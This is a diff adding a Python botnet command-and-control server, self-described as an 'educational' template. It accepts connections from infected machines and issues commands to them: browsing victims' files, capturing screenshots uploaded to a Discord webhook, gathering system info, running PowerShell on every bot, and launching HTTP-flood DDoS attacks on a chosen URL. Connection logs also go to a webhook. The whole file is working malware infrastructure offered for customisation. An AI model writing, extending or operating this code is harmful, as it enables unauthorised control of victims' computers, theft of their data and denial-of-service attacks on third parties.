@@ -1,0 +1,278 @@
+##########################################################################
+#           this c2 framework was made foe safe eductional use           # 
+#           there is no crazy fetures the whole point                    #
+#           is you customise it urself and build off of this template    #
+#                         socials                                        #      
+#               discord  - 9zvv                                          #
+#               telegram - nevtrapx                                      #
+#               twitter  - @swipvs                                       #
+#               server   - https://discord.gg/uq54CHAyXe                 #
+#                please read the readme.txt file                         #
+#                                                                        #
+#                                                                        #
+##########################################################################
+import socket
+import threading
+from colorama import Fore, Back, Style, init
+import os
+import requests
+import random
+
+os.system("title 0xLearn C2") # change 0xLearn c2 to whatever uw ant ensure title stays
+init(autoreset=True)
+
+NEV_PROMPT = Fore.BLUE + Back.MAGENTA + "[+]nev#root->" + Style.RESET_ALL
+
+banner = f"""
+{Fore.RED} ╔══════════════════════════════════════════════════════════╗
+{Fore.MAGENTA} ║                ┌─┐─┐ ┬╦  ┌─┐┌─┐┬─┐┌┐┌                    ║
+{Fore.RED} ║                │ │┌┴┬┘║  ├┤ ├─┤├┬┘│││                    ║
+{Fore.MAGENTA} ║                └─┘┴ └─╩═╝└─┘┴ ┴┴└─┘└┘                    ║
+{Fore.RED} ║                     made by nev x wiz3ard                ║
+{Fore.MAGENTA} ╚══════════════════════════════════════════════════════════╝
+{Fore.RED}                     ║             ║
+{Fore.MAGENTA}            ╔═════════════════════════════════╗
+{Fore.RED}            ║            dc - 9zvv            ║
+{Fore.RED}            ║          pegasu$ botnet         ║
+{Fore.MAGENTA}            ║              /help              ║
+{Fore.MAGENTA}            ╚═════════════════════════════════╝
+"""
+
+HOST = "0.0.0.0" # leave as this
+PORT = 4444 # leave as this
+clients = {}
+bot_counter = 1
+
+active_bot = None
+
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/put_ur_url_here" #webhook for where connection logs go
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...", 
+    # put ur user agents here or change it to random generate
+]
+
+def clear_console():
+    """Clears the console and reprints the banner."""
+    os.system("cls" if os.name == "nt" else "clear")
+    print(banner)
+
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/put_ur_url_here" # change this to the same webhook as the connection log one
+
+def send_webhook(message):
+    payload = {"content": message}
+    try:
+        requests.post(WEBHOOK_URL, json=payload)
+    except Exception as e:
+        print(f"[!] Failed to send webhook: {e}")
+
+
+def handle_client(conn, addr, bot_id):
+    try:
+        bot_name = conn.recv(1024).decode().strip()
+        if not bot_name:
+            bot_name = f"bot-{bot_id}"
+    except:
+        bot_name = f"bot-{bot_id}"
+
+    clients[bot_id] = {"conn": conn, "addr": addr, "name": bot_name}
+
+    print(f"{Fore.MAGENTA}[+] {bot_name} - {bot_id} - {addr[0]}:{addr[1]} - connected {NEV_PROMPT}")
+    send_webhook(f"[+] {bot_name} - {bot_id} - {addr[0]}:{addr[1]} - connected")
+
+    try:
+        while True:
+            data = conn.recv(4096).decode()
+            if not data:
+                break
+            print(f"{Fore.MAGENTA}[BOT {bot_id}] {data} {NEV_PROMPT}")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error with Bot {bot_id}: {e}")
+    finally:
+        print(f"{Fore.RED}[-] {bot_name} - {bot_id} - {addr[0]}:{addr[1]} - disconnected {NEV_PROMPT}")
+        send_webhook(f"[-] {bot_name} - {bot_id} - {addr[0]}:{addr[1]} - disconnected")
+        del clients[bot_id]
+        conn.close()
+
+def start_server():
+    global bot_counter
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
+    server.listen(5)
+    print(f"{Fore.MAGENTA}[C2] Listening on {HOST}:{PORT} ... {NEV_PROMPT}")
+    while True:
+        conn, addr = server.accept()
+        threading.Thread(target=handle_client, args=(conn, addr, bot_counter), daemon=True).start()
+        bot_counter += 1
+
+def send_to_all(command):
+    for bot_id, bot_info in clients.items():
+        try:
+            bot_info["conn"].send(command.encode())
+            print(f"{Fore.MAGENTA}[BOT {bot_id}] Sent command: {command} {NEV_PROMPT}")
+        except:
+            print(f"{Fore.RED}[!] Failed to send to Bot {bot_id}")
+
+def send_to_bot(bot_id, command):
+    """Send a command to a specific bot"""
+    try:
+        bot_info = clients[bot_id]
+        bot_info["conn"].send(command.encode())
+        return True
+    except:
+        print(f"{Fore.RED}[!] Failed to send to Bot {bot_id} {NEV_PROMPT}")
+        return False
+
+def list_bots():
+    print(f"{Fore.MAGENTA}[C2] Connected Bots ({len(clients)}):")
+    for bot_id, bot_info in clients.items():
+        addr = bot_info["addr"]
+        name = bot_info["name"]
+        print(f"{Fore.MAGENTA}- Bot {bot_id} ({name}) | IP: {addr[0]} Port: {addr[1]}")
+
+def browse_bot_files(bot_id):
+    """Interactive file browsing for a selected bot."""
+    bot_name = clients[bot_id]["name"]
+    print(f"{Fore.MAGENTA}[Browsing files on {bot_name}] Type /exit to stop browsing.")
+    while True:
+        if not send_to_bot(bot_id, "/files"):
+            break
+        try:
+            data = clients[bot_id]["conn"].recv(8192).decode()
+        except:
+            print(f"{Fore.RED}[!] Lost connection to bot {bot_name}")
+            break
+
+        print(f"\n{data}\n")
+        nav_cmd = input(f"{NEV_PROMPT} ({bot_name}) ").strip()
+
+        if nav_cmd.lower() == "/exit":
+            break
+        elif nav_cmd.lower() == "/back":
+            send_to_bot(bot_id, "/back")
+        elif nav_cmd.lower().startswith("/cd "):
+            send_to_bot(bot_id, nav_cmd)
+        else:
+            print(f"{Fore.RED}[!] Unknown command. Use /cd <dir>, /back, or /exit {NEV_PROMPT}")
+
+
+def send_screenshot(bot_id, webhook_url):
+    if send_to_bot(bot_id, "/ss"):  
+        try:
+            
+            data = clients[bot_id]["conn"].recv(10 * 1024 * 1024)  
+            
+            import base64
+            image_data = base64.b64decode(data)
+            headers = {"User-Agent": random.choice(USER_AGENTS)}
+            files = {"file": ("screenshot.png", image_data)}
+            requests.post(webhook_url, files=files, headers=headers)
+            print(f"{Fore.MAGENTA}[+] Screenshot from Bot {bot_id} sent to Discord.")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error sending screenshot: {e}")
+
+def show_bot_info(bot_id):
+    if send_to_bot(bot_id, "/info"):
+        try:
+            info = clients[bot_id]["conn"].recv(8192).decode()
+            print(f"\n[INFO for Bot {bot_id}]\n{info}\n")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error getting info: {e}")
+
+def main():
+    print(banner)
+    print(f"{Fore.RED}C2 Terminal {NEV_PROMPT}\n")
+    threading.Thread(target=start_server, daemon=True).start()
+
+    while True:
+        cmd = input(f"{NEV_PROMPT} ").strip()
+
+        if cmd.lower() == "exit":
+            print(f"{Fore.MAGENTA}[!] Shutting down C2 {NEV_PROMPT}")
+            for bot_id, bot_info in clients.items():
+                bot_info["conn"].close()
+            break
+
+        elif cmd.lower() == "/help":
+            print(f"""
+{Fore.MAGENTA}Commands:
+ /bots          - list connected iot
+ /files         - browse files on a iot
+ /ss            - screenshot of iot to Discord
+ /info          - get iot info 
+ /cd <dir>      - change directory
+ /back          - go back directory 
+ /clear         - clear console
+ /ddos          - HTTP request 
+ /run           - run powershell command 
+ /message       - /message <text>
+ /exit          - stop the C2 {NEV_PROMPT}""")
+
+        elif cmd.lower() == "/bots":
+            list_bots()
+
+        elif cmd.lower() == "/files":
+            list_bots()
+            bot_selection = input(f"{NEV_PROMPT} Enter Bot ID to browse: ").strip()
+            if bot_selection.isdigit() and int(bot_selection) in clients:
+                browse_bot_files(int(bot_selection))
+            else:
+                print(f"{Fore.RED}[!] Invalid Bot ID {NEV_PROMPT}")
+        elif cmd.lower() == "/ss":
+            list_bots()
+            bot_selection = input(f"{NEV_PROMPT} Enter Bot ID for screenshot: ").strip()
+            webhook = input(f"{NEV_PROMPT} Enter Discord webhook URL: ").strip()
+            if bot_selection.isdigit() and int(bot_selection) in clients:
+                send_screenshot(int(bot_selection), webhook)
+            else:
+                print(f"{Fore.RED}[!] Invalid Bot ID {NEV_PROMPT}")
+
+        elif cmd.lower() == "/info":
+            list_bots()
+            bot_selection = input(f"{NEV_PROMPT} Enter Bot ID for info: ").strip()
+            if bot_selection.isdigit() and int(bot_selection) in clients:
+                show_bot_info(int(bot_selection))
+            else:
+                print(f"{Fore.RED}[!] Invalid Bot ID {NEV_PROMPT}")
+
+        elif cmd.lower() == "/clear":
+            clear_console()
+
+        elif cmd.lower().startswith("/ddos"):
+            if not clients:
+                print(f"{Fore.RED}[!] No bots connected {NEV_PROMPT}")
+                continue
+            url = input(f"{Fore.RED}[+] Enter URL (with http/https): ").strip()
+            if not url.startswith("http"):
+                print(f"{Fore.RED}[!] Invalid URL {NEV_PROMPT}")
+                continue
+            try:
+                reqs = int(input(f"{Fore.RED}[+] Requests per loop: ").strip())
+                duration = int(input(f"{Fore.RED}[+] Duration (seconds): ").strip())
+            except:
+                print(f"{Fore.RED}[!] Invalid number {NEV_PROMPT}")
+                continue
+            for bot_id in clients:
+                send_to_bot(bot_id, f"/ddos {url} {reqs} {duration}")
+
+        elif cmd.lower().startswith("/message"):
+            message = cmd[len("/message"):].strip()
+            if message:
+                for bot_id in clients:
+                    send_to_bot(bot_id, f"/message {message}")
+            else:
+                print(f"{Fore.RED}[!] Usage: /message <text> {NEV_PROMPT}")
+
+        elif cmd.lower().startswith("/run"):
+            command_to_run = cmd[len("/run"):].strip()
+            if command_to_run:
+                for bot_id in clients:
+                    send_to_bot(bot_id, f"/run {command_to_run}")
+            else:
+                print(f"{Fore.RED}[!] Usage: /run <command> {NEV_PROMPT}")
+
+        else:
+            print(f"{Fore.RED}[!] Unknown command. Type /help {NEV_PROMPT}")
+
+if __name__ == "__main__":
+    main()
